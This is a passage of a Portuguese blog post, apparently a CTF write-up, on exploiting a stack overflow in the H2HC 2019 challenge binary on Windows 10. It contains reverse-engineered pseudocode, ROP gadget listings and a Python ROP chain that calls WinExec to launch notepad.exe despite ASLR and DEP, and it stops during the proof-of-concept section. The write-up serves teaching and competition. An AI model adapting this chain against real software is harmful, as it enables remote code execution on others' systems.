momento do call da WinExec, pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando a substituição do nosso comando O Endereço do comando tem de estar alinhado a 16 bytes para saber se o endereço está alinhado basta realizar o calculo (endereço &amp; 0xfffffffffffffff0) O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes) Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception) Conforme a definição da Microsoft a função WinExec (https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) necessita de 2 parâmetros [sourcecode language=&quot;c&quot;]UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); [/sourcecode] Onde: lpCmdLine é o comando a ser executado; uCmdShow como deve ser a visualização da aplicação filha. Este parâmetro acita diversos valores, mas os principais são: 0 - Hide, 3 - Maximize; 6 - Minimize; e 5 Show); Segundo a convenção de chamadas para 64bits devemos ter então as seguintes informações: RCX: Primeiro parâmetro da função (lpCmdLine); RDX: Segundo parâmetro da função (uCmdShow); Pilha: Shadow space; A nossa função (WinExec) exige os seguintes requisitos adicionais: Shadow space precisa ser de 24 bytes (3 * 8); Após os 24 bytes um endereço válido da aplicação. (Não entendi bem o porque, mas meu chute é que a função tenha alguma mitigação que verifique se o endereço de retorno é um endereço válido) 0x06 - ROP exploit final Utilizando os gadgets que pegamos no início deste tutorial, podemos calcular os dados de forma estratégica para montar os dados conforme os requisitos acima, ficando conforme e imagem abaixo Onde: R12 contém o endereço da função WinExec; RCX contém o parâmetro lpCmdLine, ou seja, endereço do comando a ser executado; RDX contém o parâmetro uCmdShow, ou seja, zero; Pilha (stack) contém 24 bytes de shadow space seguido de um endereço válido da aplicação; Ficando então este trecho de ROP conforme abaixo [sourcecode language=&quot;python&quot;]base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo rop_chain2 = p64(leak) # WinExec --&amp;gt; Endereço que será chamado pelo call r12 rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --&amp;gt; Ajusta o alinhamento a 16 bytes rop_chain2 += &quot;\\x41&quot; * 0x28 rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12 rop_chain2 += &quot;\\x00&quot; * (8*3) # Shadow Data rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --&amp;gt; Será usado pela função WinExec rop_chain2 += &quot;\\x00&quot; * (8*10) # Padding rop_chain2 += &quot;\\x00&quot; * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes rop_chain1 = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax rop_chain1 += &quot;\\x41&quot; * 8 cmd = &quot;notepad.exe&quot; payload3 += rop_chain1 + rop_chain2 + cmd + &quot;\\x00&quot; [/sourcecode] E tendo nosso código final funcional abaixo 0x06 - Agradecimentos Gostaria de agradecer aos amigos que jogaram comigo no CTF do H2HC, mesmo que não tenhamos conseguido resolver esse desafio de exploitation a tempo de pontuar no CTF, mas o desafio valeu a pena. Também gostaria de agradecer o Feroso pela troca de idéias e dicas durante o estudo deste exploit.","headline":"[CTF - Writeup] Exploit H2HC 2019","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/"},"url":"https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/"}</script><title>[CTF - Writeup] Exploit H2HC 2019 | Helvio Junior</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Helvio Junior"><meta name="application-name" content="Helvio Junior"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/m4v3r1ck.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Helvio Junior</a></div><div class="site-subtitle font-italic">Cyber security researcher, speaker, low level and binary exploitation entusiast. <br /><br />"I’m just a child who has never grown up. I still keep asking these 'how' & 'why' questions. Occasionally, I find an answer. Stephen Hawking"</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://www.linkedin.com/in/helviojunior" aria-label="linkedin" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.youtube.com/@Sec4US" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://github.com/helviojunior" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['helvio.junior','sec4us.com.br'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/it"> It </a> </span> <span>[CTF - Writeup] Exploit H2HC 2019</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>[CTF - Writeup] Exploit H2HC 2019</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Helvio Junior (m4v3r1ck) </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Nov 5, 2019, 11:56 PM -0300" prep="on" > Nov 5, 2019 <i class="unloaded">2019-11-05T23:56:57-03:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 17, 2023, 12:19 AM -0300" prefix="Updated " > Aug 17, 2023 <i class="unloaded">2023-08-17T00:19:29-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3184 words">17 min</span></div></div><div class="post-content"><h2>0x00 - Introdução</h2><p>Este ano (2019) tive o privilégio de participar da <a href="https://www.h2hc.com.br/h2hc/pt/">H2HC</a> e durante a conferência teve um desafio CTF do qual eu participei com alguns amigos. O jogo começo com um desafio de engenharia reversa e outro de exploitation. Neste post iremos reproduzir passo a passo o processo de exploração deste exploit.</p><h2>0x01 - Escopo</h2><p>Para este desafio nos foi entregue um binário, o mesmo disponível no link (<a href="/assets/2019/11/h2hc_2019_ctf.zip">h2hc_2019_ctf</a>), com uma descrição "Para o desafio de exploração o exploit deve funcionar no Windows 10 com full ASLR e outras mitigações habilitadas", sendo assim temos de montar um ambiente com Windows 10 atualizado e com as proteções de memória (ASLR e DEP) habilitadas.</p><p></p><h2>0x02 - Enumeração</h2><p>Como qualquer exploração, uma das principais fases é a enumeração, então vamos lá.</p><h3>0x0201 - Hashes</h3><p>[sourcecode language="shell"]# md5sum h2hc.exe<br /> ca3c795f41b65cc298a87027869a111d h2hc.exe</p><p># sha1sum h2hc.exe<br /> 20976f919b8ca7430e73e51fbd826dc570fa03d2 h2hc.exe<br /> [/sourcecode]</p><p>Utilizando o <strong>readpe</strong> do Kali podemos ver diversas informações da aplicação, abaixo segue o output de algumas partes, que extrairemos informações importantes.</p><p>[sourcecode language="shell"]# readpe --all h2hc.exe<br /> DOS Header<br /> Magic number: 0x5a4d (MZ)<br /> Bytes in last page: 144<br /> Pages in file: 3<br /> Relocations: 0<br /> Size of header in paragraphs: 4<br /> Minimum extra paragraphs: 0<br /> Maximum extra paragraphs: 65535<br /> Initial (relative) SS value: 0<br /> Initial SP value: 0xb8<br /> Initial IP value: 0<br /> Initial (relative) CS value: 0<br /> Address of relocation table: 0x40<br /> Overlay number: 0<br /> OEM identifier: 0<br /> OEM information: 0<br /> PE header offset: 0xe0<br /> COFF/File header<br /> Machine: 0x8664 IMAGE_FILE_MACHINE_AMD64<br /> Number of sections: 5<br /> Date/time stamp: 1568413383 (Fri, 13 Sep 2019 22:23:03 UTC)<br /> Symbol Table offset: 0<br /> Number of symbols: 0<br /> Size of optional header: 0xf0<br /> Characteristics: 0x22<br /> Characteristics names<br /> IMAGE_FILE_EXECUTABLE_IMAGE<br /> IMAGE_FILE_LARGE_ADDRESS_AWARE<br /> Optional/Image header<br /> Magic number: 0x20b (PE32+)<br /> Linker major version: 10<br /> Linker minor version: 0<br /> Size of .text section: 0x8200<br /> Size of .data section: 0x7c00<br /> Size of .bss section: 0<br /> Entrypoint: 0x1aa8<br /> Address of .text section: 0x1000<br /> ImageBase: 0x140000000<br /> Alignment of sections: 0x1000<br /> Alignment factor: 0x200<br /> Major version of required OS: 5<br /> Minor version of required OS: 2<br /> Major version of image: 0<br /> Minor version of image: 0<br /> Major version of subsystem: 5<br /> Minor version of subsystem: 2<br /> Size of image: 0x14000<br /> Size of headers: 0x400<br /> Checksum: 0<br /> Subsystem required: 0x3 (IMAGE_SUBSYSTEM_WINDOWS_CUI)<br /> DLL characteristics: 0x8140<br /> DLL characteristics names<br /> IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE<br /> IMAGE_DLLCHARACTERISTICS_NX_COMPAT<br /> IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE<br /> Size of stack to reserve: 0x100000<br /> Size of stack to commit: 0x1000<br /> Size of heap space to reserve: 0x100000<br /> Size of heap space to commit: 0x1000</p><p>...</p><p>Imported functions<br /> Library<br /> Name: KERNEL32.dll<br /> Functions<br /> Function<br /> Name: WinExec<br /> Function<br /> Name: GetCommandLineA</p><p>...</p><p>Sections<br /> Section<br /> Name: .text<br /> Virtual Address: 0x1000<br /> Physical Address: 0x8027<br /> Size: 0x8200 (33280 bytes)<br /> Pointer To Data: 0x400<br /> Relocations: 0<br /> Characteristics: 0x60000020<br /> Characteristic Names<br /> IMAGE_SCN_CNT_CODE<br /> IMAGE_SCN_MEM_EXECUTE<br /> IMAGE_SCN_MEM_READ</p><p>[/sourcecode]</p><p>Neste output algumas informações são importantes:</p><ul><li>ImageBase: <strong>0x140000000</strong><li>Address of .text section: <strong>0x1000</strong><li>Imported functions contains: <strong>WinExec</strong></ul><h3>0x0202 - ROP Gadgets</h3><p>Como este exploit será com proteções de memória ASLR + DEP, inevitavelmente iremos utilizar a técnica de ROP, então ainda no Kali já vamos pegar os gadgets</p><p>Utilizando a ferramenta ROP disponível em <a href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a> podemos obter todos os endereços que utilizemos futuramente</p><p>[sourcecode language="shell"]# ROPgadget --binary h2hc.exe<br /> Gadgets information<br /> ============================================================<br /> 0x000000014000567b : adc ah, bl ; add byte ptr [rax], al ; inc edx ; jmp 0x140005669<br /> 0x000000014000323b : adc al, 0 ; add byte ptr [rbp - 0x74f78b40], al ; retf<br /> 0x0000000140002276 : adc al, 0x48 ; add esp, 0x28 ; ret<br /> ...<br /> ...<br /> ...<br /> 0x00000001400036d7 : xor esi, dword ptr [rcx + rdx - 1] ; ret 0xff49<br /> 0x0000000140008c0f : xor rax, rax ; ret</p><p>Unique gadgets found: 1048<br /> [/sourcecode]</p><p>Este comando nos retornou 1048 gadgets.</p><h3>0x0203 - Interagindo com a aplicação</h3><p>Vamos então começar a brincadeira e interagir com a aplicação.</p><p>Abrinda a aplicação no Windows podemos ver que a mesma realiza um bind na porta 54345</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-05-at-17.26.53.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 600 354'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-05-at-17.26.53.png" alt="" width="600" height="354" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-05-at-17.31.24.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 69'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-05-at-17.31.24.png" alt="" width="500" height="69" class="lazyload" data-proofer-ignore></a></p><p>&nbsp;</p><p>Podemos ver que há mensagens mostradas na console da aplicação</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-05-at-17.32.31.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 600 169'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-05-at-17.32.31.png" alt="" width="600" height="169" class="lazyload" data-proofer-ignore></a></p><h2>0x03 - Entendendo a aplicação</h2><p>Como vimos anteriormente a aplicação espera uma espécie de cabeçalho (header) para realizar a comunicação, sendo assim será necessário realizar a engenharia reversa da mesma, para esta tarefa utilizaremos a ferramenta Ghidra disponível em <a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>.</p><p>Neste passo irei gastar um pouco mais de tempo para entendermos o fluxo da aplicação, fluxo este que determinará no sucesso do nosso overflow.</p><p>Analisando o comportamento da aplicação podemos ver que ela imprime em tela algumas mensagens como "Server listenning", Waiting for H2HC evil connections", sendo assim vamos começar procurando pela função que imprime essas mensagens.</p><p><a href="/assets/2019/11/socket.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1416'%3E%3C/svg%3E" data-src="/assets/2019/11/socket.png" alt="" width="2880" height="1416" class="lazyload" data-proofer-ignore></a></p><p>Na posição 140001520 encontramos essa função na qual detém o pseudocode conforma abaixo</p><p>[sourcecode language="c"]<br /> /* WARNING: Removing unreachable block (ram,0x000140001608) */</p><p>void FUN_140001520(undefined4 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)</p><p>{<br /> ulonglong uVar1;<br /> undefined *puVar2;<br /> longlong *plVar3;<br /> undefined4 local_res8 [8];<br /> longlong local_48;<br /> undefined4 local_40 [2];<br /> undefined local_38 [32];<br /> longlong local_18;</p><p> local_res8[0] = param_1;<br /> FUN_140001000((longlong)local_res8);<br /> uVar1 = FUN_1400010a0();<br /> if ((int)uVar1 == 0) {<br /> FUN_1400011c0(s_[-]_Socket_support_version_error_14000d0c8,param_2,param_3,param_4);<br /> }<br /> else {<br /> plVar3 = &amp;amp;amp;amp;amp;amp;amp;local_48;<br /> puVar2 = (undefined *)0xd449;<br /> uVar1 = FUN_140001110(s_0.0.0.0_14000d0f0,0xd449,plVar3);<br /> if ((int)uVar1 != 0) {<br /> FUN_1400011c0(s_[+]_Server_listening_14000d128,puVar2,plVar3,param_4);<br /> do {<br /> while( true ) {<br /> FUN_1400011c0(s_[+]_Waiting_for_H2HC_evil_connec_14000d140,puVar2,plVar3,param_4);<br /> local_40[0] = 0x10;<br /> plVar3 = (longlong *)local_40;<br /> puVar2 = local_38;<br /> local_18 = FUN_140001210(local_48,puVar2,plVar3);<br /> if (local_18 != -1) break;<br /> FUN_1400011c0(s__[-]_Client_socket_error_14000d168,puVar2,plVar3,param_4);<br /> }<br /> FUN_1400011c0(s__[+]_New_connection_accepted_14000d188,puVar2,plVar3,param_4);<br /> FUN_140001480(local_18);<br /> FUN_1400011c0(s__[+]_Closing_connection_14000d1a8,puVar2,plVar3,param_4);<br /> FUN_140001300(local_18);<br /> } while( true );<br /> }<br /> FUN_1400011c0(s_[-]_It_was_not_possible_to_bind:_14000d100,s_0.0.0.0_14000d0f8,0xd449,param_4);<br /> }<br /> FUN_140001050((longlong)local_res8);<br /> return;<br /> }<br /> [/sourcecode]</p><p>Quando uma conexão é recebida a mesma é tratada pela função localizada na posição 140001480, aqui nomeada FUN_140001480.</p><p><a href="/assets/2019/11/trata_conn.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1418'%3E%3C/svg%3E" data-src="/assets/2019/11/trata_conn.png" alt="" width="2880" height="1418" class="lazyload" data-proofer-ignore></a></p><p>Que temos o seu pseudocode abaixo</p><p>[sourcecode language="c"]void FUN_140001480(undefined8 param_1)</p><p>{<br /> uint uVar1;<br /> ulonglong uVar2;<br /> undefined8 uVar3;<br /> undefined8 uVar4;<br /> undefined8 local_res8 [4];<br /> int local_10;<br /> uint local_c;</p><p> local_res8[0] = param_1;<br /> FUN_140001000((longlong)local_res8);<br /> uVar4 = 0;<br /> uVar3 = 8;<br /> uVar1 = FUN_140001260(local_res8[0],&amp;amp;amp;amp;amp;amp;amp;local_10,8,0);<br /> uVar2 = (ulonglong)uVar1;<br /> FUN_1400011c0(s__[+]_Header_received:_%i_bytes_14000d068,uVar2,uVar3,uVar4);<br /> if (uVar1 == 8) {<br /> if (local_10 == 0x43483248) {<br /> FUN_140001380(local_res8[0],(ulonglong)local_c,uVar3,uVar4);<br /> }<br /> else {<br /> FUN_1400011c0(s__[-]_Error:_Invalid_cookie_14000d0a8,uVar2,uVar3,uVar4);<br /> }<br /> }<br /> else {<br /> FUN_1400011c0(s__[-]_Error:_Invalid_header_14000d088,uVar2,uVar3,uVar4);<br /> }<br /> FUN_140001050((longlong)local_res8);<br /> return;<br /> }<br /> [/sourcecode]</p><p>&nbsp;</p><p>Essa função recebe os dados que enviamos, separando um header de um body, tendo o header em <strong>local_10</strong> e o body <strong>local_res8.</strong></p><p>A aplicação realiza as seguintes ações de checagem:</p><ol><li>Verifica se o header tem 8 bytes;<li>Verifica se o header é igual a <strong>0x43483248</strong> que decodando o hexa chegamos ao texto <strong>H2HC</strong>;<li>Caso ocorra as duas condições a função FUN_140001380 é chamada.</ol><p>Sendo assim nosso header deve conter 8 bytes, onde os 4 primeiros é o texto H2HC e os 4 bytes subsequentes é o tamanho do body enviado, conforme veremos abaixo.</p><p>Segue abaixo o pseudocódigo da função FUN_140001380</p><p><a href="/assets/2019/11/trata_body.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1416'%3E%3C/svg%3E" data-src="/assets/2019/11/trata_body.png" alt="" width="2880" height="1416" class="lazyload" data-proofer-ignore></a></p><p>[sourcecode language="c"]void FUN_140001380(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)</p><p>{<br /> uint uVar1;<br /> ulonglong uVar2;<br /> undefined *puVar3;<br /> undefined8 uVar4;<br /> undefined8 local_res8;<br /> uint local_res10;<br /> undefined local_118 [252];<br /> int local_1c;<br /> int local_18;</p><p> local_res10 = (uint)param_2;<br /> local_18 = local_1c;<br /> local_res8 = param_1;<br /> FUN_140001000((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8);<br /> if (local_res10 &amp;amp;amp;amp;amp;amp;lt; 0x101) {<br /> uVar4 = 0;<br /> uVar2 = (ulonglong)(local_res10 + local_18);<br /> uVar1 = FUN_140001260(local_res8,local_118,local_res10 + local_18,0);<br /> FUN_1400011c0(s__[+]_Message_received:_%i_bytes_14000d000,(ulonglong)uVar1,uVar2,uVar4);<br /> puVar3 = local_118;<br /> sprintf(&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,s_[+]_H2HC19_message:_%s_14000d028);<br /> FUN_1400011c0(&amp;amp;amp;amp;amp;amp;amp;DAT_14000d040,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,puVar3,uVar4);<br /> FUN_1400012b0(local_res8,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,local_res10 + local_18,0);<br /> }<br /> else {<br /> FUN_1400011c0(s__[-]_Error:_Invalid_size_14000d048,param_2,param_3,param_4);<br /> }<br /> FUN_140001050((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8);<br /> return;<br /> }<br /> [/sourcecode]</p><p>Essa é a função que realiza o tratamento do body enviado, nela podemos ver que uma das primeiras verificações é se o tamanho (que foi passado no header é menor que <strong>0x101</strong>). Caso seja menor chama a função <strong>FUN_140001260</strong> que na verdade é um alias para a função de socket que recebe os dados, posteriormente mostra a mensagem "[+] Message received..." em tela com o uso da função <strong>FUN_1400011c0</strong>, utiliza o sprintf para imprimir o texto recebido em tela, em seguida executa as funções <strong>FUN_1400011c0</strong> e <strong>FUN_1400012b0</strong>. Em qualquer condição sempre executa a função <strong>FUN_140001050</strong>.</p><p>De forma simples a função <strong>FUN_1400012b0</strong> realiza o envio dos dados para o cliente via socket.</p><p>Vamos dar uma pausa na análise do código para fazer uns testes e verificar se o que vimos realmente é o que acontece.</p><p>Duas funções creio que seja melhor olharmos elas no debugger para ilustrar melhor o seu funcionamento.</p><p>Função <strong>FUN_140001260</strong> que realiza o recebimento dos dados via rede.</p><p><a href="/assets/2019/11/recv.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1152 304'%3E%3C/svg%3E" data-src="/assets/2019/11/recv.png" alt="" width="1152" height="304" class="lazyload" data-proofer-ignore></a></p><p>Função <strong>FUN_1400012b0</strong> que realiza o envio dos dados via rede</p><p><a href="/assets/2019/11/send.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1162 290'%3E%3C/svg%3E" data-src="/assets/2019/11/send.png" alt="" width="1162" height="290" class="lazyload" data-proofer-ignore></a></p><h3></h3><h3>0x0301 - PoCs</h3><p>Vamos então tentar enviar a String H2HC seguido de um tamanho menor que o 0x0101 e um buffer.</p><p>No exemplo abaixo fiz uma PoC passando como tamanho 5 bytes, mas enviando um buffer maior. Como visto a aplicação tratou os 5 bytes e retornou somente os primeiro 5 bytes da mensagem.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.07.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2110 182'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.07.png" alt="" width="2110" height="182" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.25.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1448 338'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.25.png" alt="" width="1448" height="338" class="lazyload" data-proofer-ignore></a></p><p>Vamos agora tentar passar um tamanho maior que os 0x101. Podemos ver que não houve retorno por parte da aplicação e que na console da mesma foi apresentado um erro de tamanho inválido.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.00.47.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2094 152'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.00.47.png" alt="" width="2094" height="152" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.01.00.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1448 328'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.01.00.png" alt="" width="1448" height="328" class="lazyload" data-proofer-ignore></a></p><p>Fazendo mais um teste vamos passar o valor máximo possível 0x100. Nessa condição podemos ver que ocorreu uma falha na aplicação. Mas não podemos nos empolgar, essa falha ainda não nos dá condição de execução de um código arbitrário.</p><p><a 